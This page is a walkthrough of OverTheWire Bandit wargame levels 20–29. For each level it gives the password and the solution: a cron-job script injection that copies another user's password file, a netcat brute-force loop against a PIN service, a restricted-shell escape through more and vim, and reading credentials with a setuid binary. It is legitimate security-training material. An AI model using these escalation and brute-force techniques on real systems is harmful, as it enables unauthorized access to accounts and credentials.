# Bandit Guide — Levels 20–29

[Back to Guide Index](/content/guide.md)

---

## Level 20

Password: `0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO`

The binary `./suconnect` reaches out to a localhost port specified in its arguments and expects a password match. Upon a match, it sends the password to the port.

**Solution:** Begin a `nc` listener on a port (like 65002) and tell the application to connect to it.

---

## Level 21

Password: `EeoULMCra2q0dSkYj561DX7s1CpBuOBt`

Check the `/etc/cron.d` folder for the cron job associated with bandit22. The cronjob copies bandit22's password to a readable `/tmp/` file. Simply read that file to get the flag.

---

## Level 22

Password: `tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q`

The user bandit23 also has a cronjob running where their password is copied into a temporary file, whose name is derived using an md5sum. Copy their program, run it inside `/tmp/`, change the target to `"bandit23"`, and execute it to see the filename it writes to. Then cat that file.

Cronjob running:

```bash
cat /etc/cron.d/cronjob_bandit23
# @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
# * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

Contents of the program:

```bash
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

---

## Level 23

Password: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

Hardest by far.

Bandit24 owns a cronjob that runs `bandit24.sh`:

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

Go into `/var/spool/bandit24/foo` and create a custom file with the following contents:

```bash
cp /etc/bandit_pass/bandit24 /tmp/fileofded.txt
```

Make sure the file has 777 permissions. Wait until a new minute begins — the cronjob (running with bandit24's permissions) will execute the file. Then read `fileofded.txt` for the password.

---

## Level 24

Password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

Requires bruteforcing a 4-digit code + bandit24 password at port 30002. Following script works:

```bash
coproc NC { nc 127.0.0.1 30002; }

password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for i in {0..9999}; do
    code=$(printf "%04d" "$i")

    echo "sending $password $code"

    # send newline-terminated input
    printf "%s %s\n" "$password" "$code" >&"${NC[1]}"

    # read one line of response
    IFS= read -r response <&"${NC[0]}"

    if [[ "$response" != *Wrong* ]]; then
        echo "Code: $code"
        echo "$response"
    fi
done
```

---

## Level 25

Password: `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`

A cheeky level. The private key for bandit26 is already provided in bandit25's home directory. However, bandit26's login shell is not `/bin/bash` — it's a strange file called `showtext`:

```
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

Contents of `showtext`:

```bash
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

The file uses `exec` to launch `more` on a `text.txt` file. If you log in as bandit26, a giant "BANDIT26" is displayed before kicking you out — because `more`'s pager only appears if the file can't be printed in one go.

**Solution:** Shrink your terminal to force pager mode:

```bash
stty rows 6 cols 50
```

Then:
1. Press `v` to enter vim from the pager
2. `:set shell=/bin/bash` — change vim's shell variable to bash (overrides the restricted shell)
3. `:shell` — pop open a full bash shell as bandit26

Chain of shells:
```
sshd
 └── login shell
      └── more
           └── vim
                └── bash
```

---

## Level 26

Password: `s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ`

From the bandit26 shell (previous level), there is a binary `bandit27-do` with a setuid bit owned by bandit27. Use it to cat bandit27's password:

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

---

## Level 27

Password: `upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB`

```bash
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
```

Get the only file inside the cloned repo.

---

## Level 28

Password: `Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN`

The password was accidentally pasted in a previous git commit.

```bash
git log           # see history
git show <commit> # check the second commit — it leaked the password
```

---

## Level 29

Password: `4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7`

Focus on git branches.

```bash
git branch -a      # see all branches (including remote)
git checkout dev   # password is on the dev branch
```

---

[Previous: Levels 10–19](/content/guide/page2.md) | [Next: Levels 30–33](/content/guide/page4.md) | [Guide Index](/content/guide.md)
